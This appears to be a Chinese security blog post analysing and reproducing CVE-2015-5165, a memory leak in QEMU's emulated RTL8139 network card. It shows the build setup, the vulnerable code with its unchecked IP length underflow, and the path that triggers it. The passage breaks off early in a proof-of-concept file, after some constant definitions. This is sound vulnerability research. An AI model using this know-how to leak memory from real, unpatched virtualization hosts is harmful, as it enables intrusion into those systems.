<!doctype html><html lang=zh-cn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>QEMU信息泄露漏洞分析与利用----CVE-2015-5165 | hhdx's blog</title>
<meta name=keywords content="QEMU,CVE"><meta name=description content="参考大佬们的文章复现CVE-2015-5165。
环境搭建
宿主机环境 Ubuntu 20.10
QEMU编译
QEMU commit-bd80b59源码下载。


1
2
3
4
5
6


$ unzip qemu.zip
$ mkdir -p bin/debug/native
$ cd bin/debug/native
$ sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev
$ ../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror
$ make


如果出现以下错误，给文件 commands-posix.c 增加头文件 <sys/sysmacros.h> 即可解决。


1
2
3


/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor':
/repo/qemu/qga/commands-posix.c:640: undefined reference to `major'
/usr/bin/ld: /repo/qemu/qga/commands-posix.c:641: undefined reference to `minor'


制作QEMU虚拟机
这里我使用的Ubuntu 16.04 Server i386作为QEMU客户机系统。点击下载。
还需要下载安装VNC-Viewer，稍后会用到。链接。


1
2
3
4
5
6


$ ./qemu-img create -f qcow2 ~/tmp/vm/ubuntu.img 10G
$ sudo dpkg -i VNC-Viewer-6.20.529-Linux-x64.deb
$ x86_64-softmmu/qemu-system-x86_64 -boot d -cdrom \  # 能用嵌套虚拟就用(添加--enable-kvm)
~/tmp/iso/ubuntu-16.04.6-server-i386.iso \
-hda ~/tmp/vm/ubuntu.img -m 1024
$ vncviewer host:port  # 连接上，安装就好


（尽量使用&ndash;enable-kvm，否则卡的受不了，安装系统安了四五个小时。。。）"><meta name=author content="hhdx"><link rel=canonical href=https://hhdx.xyz/post/cve-2015-5165/><link crossorigin=anonymous href=/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as=style><link rel=icon href=https://hhdx.xyz/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hhdx.xyz/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hhdx.xyz/favicon-32x32.png><link rel=apple-touch-icon href=https://hhdx.xyz/apple-touch-icon.png><link rel=mask-icon href=https://hhdx.xyz/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=https://hhdx.xyz/post/cve-2015-5165/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hhdx.xyz/post/cve-2015-5165/"><meta property="og:site_name" content="hhdx's blog"><meta property="og:title" content="QEMU信息泄露漏洞分析与利用----CVE-2015-5165"><meta property="og:description" content="参考大佬们的文章复现CVE-2015-5165。
环境搭建 宿主机环境 Ubuntu 20.10
QEMU编译 QEMU commit-bd80b59源码下载。
1 2 3 4 5 6 $ unzip qemu.zip $ mkdir -p bin/debug/native $ cd bin/debug/native $ sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev $ ../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror $ make 如果出现以下错误，给文件 commands-posix.c 增加头文件 <sys/sysmacros.h> 即可解决。
1 2 3 /usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor': /repo/qemu/qga/commands-posix.c:640: undefined reference to `major' /usr/bin/ld: /repo/qemu/qga/commands-posix.c:641: undefined reference to `minor' 制作QEMU虚拟机 这里我使用的Ubuntu 16.04 Server i386作为QEMU客户机系统。点击下载。
还需要下载安装VNC-Viewer，稍后会用到。链接。
1 2 3 4 5 6 $ ./qemu-img create -f qcow2 ~/tmp/vm/ubuntu.img 10G $ sudo dpkg -i VNC-Viewer-6.20.529-Linux-x64.deb $ x86_64-softmmu/qemu-system-x86_64 -boot d -cdrom \ # 能用嵌套虚拟就用(添加--enable-kvm) ~/tmp/iso/ubuntu-16.04.6-server-i386.iso \ -hda ~/tmp/vm/ubuntu.img -m 1024 $ vncviewer host:port # 连接上，安装就好 （尽量使用–enable-kvm，否则卡的受不了，安装系统安了四五个小时。。。）"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-12-05T15:58:52+00:00"><meta property="article:modified_time" content="2020-12-05T15:58:52+00:00"><meta property="article:tag" content="Qemu"><meta property="article:tag" content="CVE"><meta name=twitter:card content="summary"><meta name=twitter:title content="QEMU信息泄露漏洞分析与利用----CVE-2015-5165"><meta name=twitter:description content="参考大佬们的文章复现CVE-2015-5165。
环境搭建
宿主机环境 Ubuntu 20.10
QEMU编译
QEMU commit-bd80b59源码下载。


1
2
3
4
5
6


$ unzip qemu.zip
$ mkdir -p bin/debug/native
$ cd bin/debug/native
$ sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev
$ ../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror
$ make


如果出现以下错误，给文件 commands-posix.c 增加头文件 <sys/sysmacros.h> 即可解决。


1
2
3


/usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor':
/repo/qemu/qga/commands-posix.c:640: undefined reference to `major'
/usr/bin/ld: /repo/qemu/qga/commands-posix.c:641: undefined reference to `minor'


制作QEMU虚拟机
这里我使用的Ubuntu 16.04 Server i386作为QEMU客户机系统。点击下载。
还需要下载安装VNC-Viewer，稍后会用到。链接。


1
2
3
4
5
6


$ ./qemu-img create -f qcow2 ~/tmp/vm/ubuntu.img 10G
$ sudo dpkg -i VNC-Viewer-6.20.529-Linux-x64.deb
$ x86_64-softmmu/qemu-system-x86_64 -boot d -cdrom \  # 能用嵌套虚拟就用(添加--enable-kvm)
~/tmp/iso/ubuntu-16.04.6-server-i386.iso \
-hda ~/tmp/vm/ubuntu.img -m 1024
$ vncviewer host:port  # 连接上，安装就好


（尽量使用&ndash;enable-kvm，否则卡的受不了，安装系统安了四五个小时。。。）"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://hhdx.xyz/post/"},{"@type":"ListItem","position":2,"name":"QEMU信息泄露漏洞分析与利用----CVE-2015-5165","item":"https://hhdx.xyz/post/cve-2015-5165/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"QEMU信息泄露漏洞分析与利用----CVE-2015-5165","name":"QEMU信息泄露漏洞分析与利用----CVE-2015-5165","description":"参考大佬们的文章复现CVE-2015-5165。\n环境搭建 宿主机环境 Ubuntu 20.10\nQEMU编译 QEMU commit-bd80b59源码下载。\n1 2 3 4 5 6 $ unzip qemu.zip $ mkdir -p bin/debug/native $ cd bin/debug/native $ sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev $ ../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror $ make 如果出现以下错误，给文件 commands-posix.c 增加头文件 \u0026lt;sys/sysmacros.h\u0026gt; 即可解决。\n1 2 3 /usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor\u0026#39;: /repo/qemu/qga/commands-posix.c:640: undefined reference to `major\u0026#39; /usr/bin/ld: /repo/qemu/qga/commands-posix.c:641: undefined reference to `minor\u0026#39; 制作QEMU虚拟机 这里我使用的Ubuntu 16.04 Server i386作为QEMU客户机系统。点击下载。\n还需要下载安装VNC-Viewer，稍后会用到。链接。\n1 2 3 4 5 6 $ ./qemu-img create -f qcow2 ~/tmp/vm/ubuntu.img 10G $ sudo dpkg -i VNC-Viewer-6.20.529-Linux-x64.deb $ x86_64-softmmu/qemu-system-x86_64 -boot d -cdrom \\ # 能用嵌套虚拟就用(添加--enable-kvm) ~/tmp/iso/ubuntu-16.04.6-server-i386.iso \\ -hda ~/tmp/vm/ubuntu.img -m 1024 $ vncviewer host:port # 连接上，安装就好 （尽量使用\u0026ndash;enable-kvm，否则卡的受不了，安装系统安了四五个小时。。。）\n","keywords":["QEMU","CVE"],"articleBody":"参考大佬们的文章复现CVE-2015-5165。\n环境搭建 宿主机环境 Ubuntu 20.10\nQEMU编译 QEMU commit-bd80b59源码下载。\n1 2 3 4 5 6 $ unzip qemu.zip $ mkdir -p bin/debug/native $ cd bin/debug/native $ sudo apt-get install zlib1g-dev libglib2.0-dev libpixman-1-dev $ ../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror $ make 如果出现以下错误，给文件 commands-posix.c 增加头文件 即可解决。\n1 2 3 /usr/bin/ld: qga/commands-posix.o: in function `dev_major_minor': /repo/qemu/qga/commands-posix.c:640: undefined reference to `major' /usr/bin/ld: /repo/qemu/qga/commands-posix.c:641: undefined reference to `minor' 制作QEMU虚拟机 这里我使用的Ubuntu 16.04 Server i386作为QEMU客户机系统。点击下载。\n还需要下载安装VNC-Viewer，稍后会用到。链接。\n1 2 3 4 5 6 $ ./qemu-img create -f qcow2 ~/tmp/vm/ubuntu.img 10G $ sudo dpkg -i VNC-Viewer-6.20.529-Linux-x64.deb $ x86_64-softmmu/qemu-system-x86_64 -boot d -cdrom \\ # 能用嵌套虚拟就用(添加--enable-kvm) ~/tmp/iso/ubuntu-16.04.6-server-i386.iso \\ -hda ~/tmp/vm/ubuntu.img -m 1024 $ vncviewer host:port # 连接上，安装就好 （尽量使用–enable-kvm，否则卡的受不了，安装系统安了四五个小时。。。）\n前置知识 网络 因为涉及到了网卡，而且产生漏洞是数据包长度溢出所导致，所以需要了解一定的网络知识，可以看下面来复习一下。\nOSI(Open Systems Interconnection)将网络协议分为7层，从上往下依次是：\n应用层 表示层 会话层 传输层 网络层 数据链路层 物理层 而现实中使用的TCP/IP协议是5层的，依次是：\n应用层，是网络应用程序及其应用层协议存留的地方。因特网的应用层包括许多协议，常见的有HTTP(它为web文档提供了请求和传送)、SMTP(它提供了电子邮件报文的传输)和FTP(它提供了两个端系统之间的文件传送)。\n传输层，负责为信源和信宿提供应用程序进程（包括同一终端上的不同进程）间的数据传输服务，这一层上主要定义了两个传输协议，传输控制协议即TCP和用户数据报协议UDP。\n网络层，负责将数据报独立地从信源发送到信宿，主要解决路由选择、拥塞控制和网络互联等问题。\n数据链路层，负责将IP数据报封装成合适在物理网络上传输的帧格式并传输，或将从物理网络接收到的帧解封，取出IP数据报交给网络层。\n物理层，负责将比特流在结点间传输，即负责物理传输。该层的协议既与链路有关也与传输介质有关。\nIP数据包(IPv4)头部长度为20-60字节，TCP报文头部长度也是20-60字节。\n以太网帧 在以太网链路上的数据包称作以太帧。以太帧起始部分由前导码和帧开始符组成。后面紧跟着一个以太网报头，以MAC地址说明目的地址和源地址。帧的中部是该帧负载的包含其他协议报头的数据包(例如IP协议)。以太帧由一个32位冗余校验码结尾。它用于检验数据传输是否出现损坏。\n字段 含义 前同步码 用来使接收端的适配器在接收 MAC 帧时能够迅速调整时钟频率，使它和发送端的频率相同。前同步码为 7 个字节，1 和 0 交替。 帧开始定界符 帧的起始符，为 1 个字节。前 6 位 1 和 0 交替，最后的两个连续的 1 表示告诉接收端适配器：“帧信息要来了，准备接收”。 目的地址 接收帧的网络适配器的物理地址（MAC 地址），为 6 个字节（48 比特）。作用是当网卡接收到一个数据帧时，首先会检查该帧的目的地址，是否与当前适配器的物理地址相同，如果相同，就会进一步处理；如果不同，则直接丢弃。 源地址 发送帧的网络适配器的物理地址（MAC 地址），为 6 个字节（48 比特）。 类型 上层协议的类型。由于上层协议众多，所以在处理数据的时候必须设置该字段，标识数据交付哪个协议处理。例如，字段为 0x0800 时，表示将数据交付给 IP 协议。 数据 也称为效载荷，表示交付给上层的数据。以太网帧数据长度最小为 46 字节，最大为 1500 字节。如果不足 46 字节时，会填充到最小长度。最大值也叫最大传输单元（MTU）。 在 Linux 中，使用 ifconfig 命令可以查看该值，通常为 1500。 帧检验序列 FCS 检测该帧是否出现差错，占 4 个字节（32 比特）。发送方计算帧的循环冗余码校验（CRC）值，把这个值写到帧里。接收方计算机重新计算 CRC，与 FCS 字段的值进行比较。如果两个值不相同，则表示传输过程中发生了数据丢失或改变。这时，就需要重新传输这一帧。 IP数据报 字段 含义 版本号 占用4位二进制数，表示该IP数据报使用的IP协议版本。目前Internet中使用的主要是TCP/IP协议族中版本号为4的IP协议。 首部长度 占用4位二进制位，此域指出整个报头的长度（包括选项），该长度是以32位二进制数为一个计数单位的，接收端通过此域可以计算出报头在何处结束及从何处开始读数据。普通IP数据报（没有任何选项）该字段的值是5（即20个字节的长度）。 服务类型(TOS, Type Of Service) 占用8位二进制位，用于规定本数据报的处理方式。 总长度 占用16位二进制位，总长度字段是指整个IP数据报的长度（报头区+数据区），以字节为单位。 标识 占16位（第二行四个字节中1~15位），它是一个计数器，用来产生数据报的标识，即每产生一个数据报贴上一个标识。 标志 目前只有前两位有意义。标志字段的最低位是 MF (More Fragment)。MF = 1 表示后面“还有分片”。MF = 0 表示最后一个分片。标志字段中间的一位是 DF (Don’t Fragment) 。只有当 DF = 0 时才允许分片。 片偏移 较长的分组在分片后某片在原分组中的相对位置。片偏移以 8 个字节为偏移单位。 TTL Time To Live，该字段指定IP包被路由器丢弃之前允许通过的最大网段数量。 RTL8139 RTL8139被用在许多古老或者廉价的设备中，支持10/100MBit。支持的速率较慢，但由于它的简洁性，如今它广泛被用在虚拟化环境中。这也使得它的驱动程序比较简单，所以通常是OS开发爱好者们的第一个设备。它支持两种接收发送(Receive/Transmit)模式：C mode和C+ mode。vender ID: 0x10EC，device ID: 0x8139。\nQEMU中模拟的RTL8139，对应的结构为RTL8139State(位于文件hw/net/rtl8139.c:435)。\nRTL8139State结构体中许多的字段就是RTL8139网卡内部的寄存器，关于这些寄存器的描述，可以参考厂商Realtek提供的Datesheet。下图为RTL8139在C+模式下寄存器的介绍：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 +---------------------------+----------------------------+ 0x00 | MAC0 | MAR0 | +---------------------------+----------------------------+ 0x10 | TxStatus0 | +--------------------------------------------------------+ 0x20 | TxAddr0 | +-------------------+-------+----------------------------+ 0x30 | RxBuf |ChipCmd| | +-------------+------+------+----------------------------+ 0x40 | TxConfig | RxConfig | ... | +-------------+-------------+----------------------------+ | | | skipping irrelevant registers | | | +---------------------------+--+------+------------------+ 0xd0 | ... | |TxPoll| ... | +-------+------+------------+--+------+--+---------------+ 0xe0 | CpCmd | ... |RxRingAddrLO|RxRingAddrHI| ... | +-------+------+------------+------------+---------------+ TxConfig：发送数据相关的配置参数 RxConfig：接收数据相关的配置参数 CpCmd：C+ 模式相关配置参数，比如： CplusRxEnd 表示启用接收 CplusTxEnd 表示启用发送 TxAddr0：Tx descriptors table 相关的物理内存地址 0x20 ~ 0x27：Transmit Normal Priority Descriptors Start Address 0x28 ~ 0x2F：Transmit High Priority Descriptors Start Address RxRingAddrLO：Rx descriptors table 物理内存地址低 32 位 RxRingAddrHI：Rx descriptors table 物理内存地址高 32 位 TxPoll：让网卡检查 Tx descriptors 关于 Descriptor(Tx缓冲区是网卡的发送数据缓冲区，而Rx缓冲区则是接收数据缓冲区。Tx表以及Rx表为一个16字节结构体大小的数组，该表中的Descriptor包含缓冲区的具体位置) 的定义，同样可以参考厂商 Realtek 提供的 Datasheet 手册，下图为 Transmit Descriptor 的定义：\nPhrack的文章[4]中将其定义为（这是为了方便设置的，QEMU中并不存在这个结构）：\n1 2 3 4 5 6 struct rtl8139_desc { uint32_t dw0; uint32_t dw1; uint32_t buf_lo; uint32_t buf_hi; }; 漏洞分析 漏洞出现网卡的C+模式中，文件位于hw/net/rtl8139.c:1827中的函数rtl8139_cplus_transmit_one中\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 static int rtl8139_cplus_transmit_one(RTL8139State *s) { // ....... /* Now decide if descriptor being processed is holding the last segment of packet */ if (txdw0 \u0026 CP_TX_LS) { // ... uint8_t *saved_buffer = s-\u003ecplus_txbuffer; int saved_size = s-\u003ecplus_txbuffer_offset; int saved_buffer_len = s-\u003ecplus_txbuffer_len; // ... if (txdw0 \u0026 (CP_TX_IPCS | CP_TX_UDPCS | CP_TX_TCPCS | CP_TX_LGSEN)) { DPRINTF(\"+++ C+ mode offloaded task checksum\\n\"); /* ip packet header */ ip_header *ip = NULL; int hlen = 0; uint8_t ip_protocol = 0; uint16_t ip_data_len = 0; uint8_t *eth_payload_data = NULL; size_t eth_payload_len = 0; // 这里saved_buffer其实就是以太网帧 int proto = be16_to_cpu(*(uint16_t *)(saved_buffer + 12)); if (proto == ETH_P_IP) // 检查以太网中的Type，即上层协议类型 { DPRINTF(\"+++ C+ mode has IP packet\\n\"); /* not aligned */ // 跳过以太网帧头，到达IP数据报 eth_payload_data = saved_buffer + ETH_HLEN; eth_payload_len = saved_size - ETH_HLEN; ip = (ip_header*)eth_payload_data; if (IP_HEADER_VERSION(ip) != IP_HEADER_VERSION_4) { DPRINTF(\"+++ C+ mode packet has bad IP version %d \" \"expected %d\\n\", IP_HEADER_VERSION(ip), IP_HEADER_VERSION_4); ip = NULL; } else { hlen = IP_HEADER_LENGTH(ip); ip_protocol = ip-\u003eip_p; // vulnerability here // 完全信任了用户所提供的IP数据报的头长度和数据长度 // ip_data_len为uint16_t类型 // 当be16_to_cpu(ip-\u003eip_len) \u003c hlen时，就会发生溢出 // 最大0xFFFF ip_data_len = be16_to_cpu(ip-\u003eip_len) - hlen; } } // ...... } 该函数中，计算IP数据报的数据长度时，没有对总长度ip-\u003eip_len和头长度hlen进行校验，在恶意构造为ip-\u003eip_len \u003c heln时，就会发生溢出。在此函数中的后面，因为长度过长就会使用rtl8139_transfer_frame进行分片发送：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 static int rtl8139_cplus_transmit_one(RTL8139State *s) { // ....... if ((txdw0 \u0026 CP_TX_LGSEN) \u0026\u0026 ip_protocol == IP_PROTO_TCP) { int large_send_mss = (txdw0 \u003e\u003e 16) \u0026 CP_TC_LGSEN_MSS_MASK; DPRINTF(\"+++ C+ mode offloaded task TSO MTU=%d IP data %d \" \"frame data %d specified MSS=%d\\n\", ETH_MTU, ip_data_len, saved_size - ETH_HLEN, large_send_mss); int tcp_send_offset = 0; int send_count = 0; /* maximum IP header length is 60 bytes */ uint8_t saved_ip_header[60]; /* save IP header template; data area is used in tcp checksum calculation */ memcpy(saved_ip_header, eth_payload_data, hlen); /* a placeholder for checksum calculation routine in tcp case */ uint8_t *data_to_checksum = eth_payload_data + hlen - 12; // size_t data_to_checksum_len = eth_payload_len - hlen + 12; /* pointer to TCP header */ tcp_header *p_tcp_hdr = (tcp_header*)(eth_payload_data + hlen); int tcp_hlen = TCP_HEADER_DATA_OFFSET(p_tcp_hdr); /* ETH_MTU = ip header len + tcp header len + payload */ // 这里利用了上面计算得出的ip_data_len int tcp_data_len = ip_data_len - tcp_hlen; int tcp_chunk_size = ETH_MTU - hlen - tcp_hlen; DPRINTF(\"+++ C+ mode TSO IP data len %d TCP hlen %d TCP \" \"data len %d TCP chunk size %d\\n\", ip_data_len, tcp_hlen, tcp_data_len, tcp_chunk_size); /* note the cycle below overwrites IP header data, but restores it from saved_ip_header before sending packet */ int is_last_frame = 0; // 这里利用tcp_data_len进行tcp数据包的分片 for (tcp_send_offset = 0; tcp_send_offset \u003c tcp_data_len; tcp_send_offset += tcp_chunk_size) { uint16_t chunk_size = tcp_chunk_size; /* check if this is the last frame */ if (tcp_send_offset + tcp_chunk_size \u003e= tcp_data_len) { is_last_frame = 1; chunk_size = tcp_data_len - tcp_send_offset; } DPRINTF(\"+++ C+ mode TSO TCP seqno %08x\\n\", be32_to_cpu(p_tcp_hdr-\u003eth_seq)); /* add 4 TCP pseudoheader fields */ /* copy IP source and destination fields */ memcpy(data_to_checksum, saved_ip_header + 12, 8); DPRINTF(\"+++ C+ mode TSO calculating TCP checksum for \" \"packet with %d bytes data\\n\", tcp_hlen + chunk_size); if (tcp_send_offset) { memcpy((uint8_t*)p_tcp_hdr + tcp_hlen, (uint8_t*)p_tcp_hdr + tcp_hlen + tcp_send_offset, chunk_size); } /* keep PUSH and FIN flags only for the last frame */ if (!is_last_frame) { TCP_HEADER_CLEAR_FLAGS(p_tcp_hdr, TCP_FLAG_PUSH|TCP_FLAG_FIN); } /* recalculate TCP checksum */ ip_pseudo_header *p_tcpip_hdr = (ip_pseudo_header *)data_to_checksum; p_tcpip_hdr-\u003ezeros = 0; p_tcpip_hdr-\u003eip_proto = IP_PROTO_TCP; p_tcpip_hdr-\u003eip_payload = cpu_to_be16(tcp_hlen + chunk_size); p_tcp_hdr-\u003eth_sum = 0; int tcp_checksum = ip_checksum(data_to_checksum, tcp_hlen + chunk_size + 12); DPRINTF(\"+++ C+ mode TSO TCP checksum %04x\\n\", tcp_checksum); p_tcp_hdr-\u003eth_sum = tcp_checksum; /* restore IP header */ memcpy(eth_payload_data, saved_ip_header, hlen); /* set IP data length and recalculate IP checksum */ ip-\u003eip_len = cpu_to_be16(hlen + tcp_hlen + chunk_size); /* increment IP id for subsequent frames */ ip-\u003eip_id = cpu_to_be16(tcp_send_offset/tcp_chunk_size + be16_to_cpu(ip-\u003eip_id)); ip-\u003eip_sum = 0; ip-\u003eip_sum = ip_checksum(eth_payload_data, hlen); DPRINTF(\"+++ C+ mode TSO IP header len=%d \" \"checksum=%04x\\n\", hlen, ip-\u003eip_sum); int tso_send_size = ETH_HLEN + hlen + tcp_hlen + chunk_size; DPRINTF(\"+++ C+ mode TSO transferring packet size \" \"%d\\n\", tso_send_size); // 将分片后的数据使用rtl8139_transfer_frame进行发送 rtl8139_transfer_frame(s, saved_buffer, tso_send_size, 0, (uint8_t *) dot1q_buffer); /* add transferred count to TCP sequence number */ p_tcp_hdr-\u003eth_seq = cpu_to_be32(chunk_size + be32_to_cpu(p_tcp_hdr-\u003eth_seq)); ++send_count; } /* Stop sending this frame */ saved_size = 0; } // ....... } 函数rtl8139_transfer_frame。可以看到如果有TxLoopBack标志的话，会调用rtl8139_do_receive发送给自己。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 static void rtl8139_transfer_frame(RTL8139State *s, uint8_t *buf, int size, int do_interrupt, const uint8_t *dot1q_buf) { // ....... if (TxLoopBack == (s-\u003eTxConfig \u0026 TxLoopBack)) { size_t buf2_size; uint8_t *buf2; if (iov) { buf2_size = iov_size(iov, 3); buf2 = g_malloc(buf2_size); iov_to_buf(iov, 3, 0, buf2, buf2_size); buf = buf2; } DPRINTF(\"+++ transmit loopback mode\\n\"); rtl8139_do_receive(qemu_get_queue(s-\u003enic), buf, size, do_interrupt); // ....... } 漏洞代码触发 在该设备源码文件下方可以找到设备的TypeInfo和rtl8139_class_init结构体，后者中可以看到引用了pci_rtl8139_realize函数，其中初始化了PMIO和MMIO。通过查看PMIO和MMIO处理函数的调用链，可以发现最终都是调用了以下几个函数：\n1 2 3 4 5 6 static uint32_t rtl8139_io_readb(void *opaque, uint8_t addr); static uint32_t rtl8139_io_readw(void *opaque, uint8_t addr); static uint32_t rtl8139_io_readl(void *opaque, uint8_t addr); static void rtl8139_io_writeb(void *opaque, uint8_t addr, uint32_t val); static void rtl8139_io_writew(void *opaque, uint8_t addr, uint32_t val); static void rtl8139_io_writel(void *opaque, uint8_t addr, uint32_t val); 在rtl8139_io_writeb中，if (val \u0026 (1 \u003c\u003c 6))满足，则会调用rtl8139_cplus_transmit，而其中会调用漏洞函数rtl8139_cplus_transmit_one。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // rtl8139_cplus_transmit_one if (!rtl8139_transmitter_enabled(s)) // CmdTxEnb { DPRINTF(\"+++ C+ mode: transmitter disabled\\n\"); return 0; } if (!rtl8139_cp_transmitter_enabled(s)) // CPlusTxEnb { DPRINTF(\"+++ C+ mode: C+ transmitter disabled\\n\"); return 0 ; } if (!(txdw0 \u0026 CP_TX_OWN)) // CP_TX_OWN { DPRINTF(\"C+ Tx mode : descriptor %d is owned by host\\n\", descriptor); return 0 ; } if (txdw0 \u0026 CP_TX_FS) // CP_TX_FS { DPRINTF(\"+++ C+ Tx mode : descriptor %d is first segment \" \"descriptor\\n\", descriptor); /* reset internal buffer offset */ s-\u003ecplus_txbuffer_offset = 0; } if (txdw0 \u0026 (CP_TX_IPCS | CP_TX_UDPCS | CP_TX_TCPCS | CP_TX_LGSEN)) { if (proto == ETH_P_IP); if (txdw0 \u0026 CP_TX_IPCS); if ((txdw0 \u0026 CP_TX_LGSEN) \u0026\u0026 ip_protocol == IP_PROTO_TCP); } 调用链：\nrtl8139_io_writeb-\u003ertl8139_cplus_transmit-\u003ertl8139_cplus_transmit_one-\u003ertl8139_transfer_frame-\u003ertl8139_do_receive。\nDebug 因为没使用kvm，使用的Tiny Code Generator模式执行虚拟机，调试过程中总是接收到SIGUSR1信号，然后中断。在gdbscript中添加以下命令可解。\n1 handle SIGUSR1 nostop noprint PoC poc.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 #include #include #include #include #include #include #include #include // 页面相关 #define PAGE_SHIFT 12 #define PAGE_SIZE (1 \u003c\u003c PAGE_SHIFT) #define PAGE_PRESENT (1ULL \u003c\u003c 63) #define PAGE_PFN ((1ULL \u003c\u003c 55) - 1) // RTL8139 PMIO base address #define PMIO_BASE 0xC000 // Ethernet Frame // DST(6) + SRC(6) + Length/Type(2) + MTU(1500) #define RTL8139_BUFFER_SIZE 1514 /* w0 ownership flag */ #define CP_RX_OWN (1\u003c\u003c31) /* w0 ownership flag */ #define CP_TX_OWN (1\u003c\u003c31) /* w0 end of ring flag */ #define CP_TX_EOR (1\u003c\u003c30) /* first segment of received packet flag */ #define CP_TX_FS (1\u003c\u003c29) /* last segment of received packet flag */ #define CP_TX_LS (1\u003c\u003c28) /* large send packet flag */ #define CP_TX_LGSEN (1\u003c\u003c27) /* large send MSS mask, bits 16...25 */ #define CP_TC_LGSEN_MSS_MASK ((1 \u003c\u003c 12) - 1) /* IP checksum offload flag */ #define CP_TX_IPCS (1\u003c\u003c18) /* UDP checksum offload flag */ #define CP_TX_UDPCS (1\u003c\u003c17) /* TCP checksum offload flag */ #define CP_TX_TCPCS (1\u003c\u003c16) /* w0 bits 0...15 : buffer size */ #define CP_TX_BUFFER_SIZE (1\u003c\u003c16) #define CP_TX_BUFFER_SIZE_MASK (CP_TX_BUFFER_SIZE - 1) /* w1 add tag flag */ #define CP_TX_TAGC (1\u003c\u003c17) /* w1 bits 0...15 : VLAN tag (big endian) */ #define CP_TX_VLAN_TAG_MASK ((1\u003c\u003c16) - 1) /* w2 low 32bit of Rx buffer ptr */ /* w3 high 32bit of Rx buffer ptr */ /* set after transmission */ /* FIFO underrun flag */ #define CP_TX_STATUS_UNF (1\u003c\u003c25) /* transmit error summary flag, valid if set any of three below */ #define CP_TX_STATUS_TES (1\u003c\u003c23) /* out-of-window collision flag */ #define CP_TX_STATUS_OWC (1\u003c\u003c22) /* link failure flag */ #define CP_TX_STATUS_LNKF (1\u003c\u003c21) /* excessive collisions flag */ #define CP_TX_STATUS_EXC (1\u003c\u003c20) /* Symbolic offsets to registers. */ enum RTL8139_registers { MAC0 = 0, /* Ethernet 